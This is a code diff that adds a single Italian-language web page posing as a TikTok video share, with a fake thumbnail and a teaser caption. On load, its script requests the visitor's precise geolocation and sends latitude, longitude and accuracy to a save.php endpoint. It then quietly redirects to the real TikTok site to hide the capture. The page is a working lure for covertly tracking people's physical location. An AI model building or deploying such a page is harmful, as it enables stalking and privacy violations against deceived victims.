@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      text-align: center;
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      padding: 20px;
+    }
+    img {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+    .caption {
+      color: #ccc;
+      margin-top: 10px;
+    }
+    .logo {
+      margin-top: 20px;
+      width: 40px;
+    }
+  </style>
+  <script>
+    function salvaPosizione(lat, lon, acc) {
+      fetch("save.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc)
+        .then(() => {
+          setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+          }, 2500);
+        });
+    }
+
+    window.onload = function () {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          salvaPosizione(lat, lon, acc);
+        });
+      } else {
+        window.location.href = "https://www.tiktok.com";
+      }
+    };
+  </script>
+</head>
+<body>
+  <div class="container">
+    <img src="tiktok_thumb.jpg" alt="Video TikTok">
+    <div class="caption">@utente89 • Guarda il nuovo video che fa discutere 😳</div>
+    <img class="logo" src="tiktok.png" alt="TikTok">
+  </div>
+</body>
+</html>
